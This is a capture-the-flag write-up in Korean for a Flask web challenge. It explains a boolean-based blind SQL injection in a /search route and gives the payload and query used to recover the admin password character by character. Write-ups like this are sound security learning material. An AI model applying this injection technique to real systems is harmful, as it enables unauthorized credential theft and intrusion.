# Category

web

# Overview

Interface for browsing secret data. But their existence ONLY.

# Analysis

- 제공된 파일들을 확인한 결과 파이썬 플라스크로 만들어진 웹서비스이며, `admin`유저로 로그인 시 `/admin`으로 라우팅되며 `flag.txt`의 정보를 획득할 수 있는 것으로 확인함.

- admin의 비밀번호는 `urandom(8).hex()`를 통해 16글자의 16진수 비밀번호라는 것을 유추할 수 있음.

- `/search` 라우트의 경우 `f-string`으로 sql을 완성해 요청하여, 결과를 `COUNT(*)` 기반 `boolean`응답으로 반환하기 때문에, 응답 사용자가 요청하는 쿼리를 통해 boolean-based blind SQL injection공격에 노출될 수 있는 취약점이 확인되었다.

# Exploitation

1. 현재의 쿼리가 `SELECT COUNT(*) FROM secret_data WHERE title LIKE '%{query}%'`로 일치하는 개수인 `COUNT(*)`를 반환하고 있고, 기존 조건문을 항상 true로 반환되게 만들며, 추가로 비밀번호를 맞추기 위한 새로운 조건문을 `' AND (SELECT password FROM users WHERE username = 'admin') LIKE '0`과 같이 추가해 참 거짓을 판별할 수 있는 방식으로 1자리씩 대입하여 비밀번호를 찾을 수 있다.
   틀린 비밀번호의 경우 `COUNT(*)`이 0이 될 것이기 때문에 비밀번호의 정답여부를 구분할 수 있고 admin 비밀번호의 자리수와 구성을 확인했기 때문에, 16자리 비밀번호를 찾을 때까지 반복하면 된다.

   ```sql
   # 공격을 위해 추가한 AND 조건 앞까지의 기본 쿼리문은 %을 통해 항상 참이 되는 결과를 응답
   # 이후 AND 조건을 통해 일치하는 비밀번호 유추
   SELECT COUNT(*)
   FROM secret_data
   WHERE title LIKE '%'
   AND (
     SELECT password
     FROM users
     WHERE username = 'admin'
   ) LIKE '0%'

   # '0%' [0-F]까지 대입하며 16자 비밀번호를 찾아냄
   LIKE '1%'
   LIKE '2%'
   ...
   LIKE 'a%'
   ```

   solve.py를 통해 admin에 일치하는 비밀번호를 찾을 수 있다.

   ```bash
   python solve.py
   ```

2. admin의 비밀번호를 획득한 후 `/admin`라우트에 `admin / 비밀번호`로 접근 시 flag를 획득할 수 있다.

# Flag

`DH{94...c9}`
